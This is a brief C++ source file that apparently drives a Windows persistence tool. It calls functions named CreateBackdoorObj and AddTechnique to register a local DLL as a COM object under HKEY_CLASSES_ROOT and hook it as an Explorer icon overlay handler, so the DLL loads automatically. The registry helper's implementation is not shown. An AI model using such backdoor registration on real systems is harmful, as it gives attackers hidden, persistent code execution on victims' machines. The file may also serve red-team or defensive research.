#include "reg.h"



int main()
{
	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.4.dll";
	GUID guid = reg::CreateBackdoorObj( HKCR, dllPath);
	reg::AddTechnique(ICON_OVERLAY, NULL, guid);

}
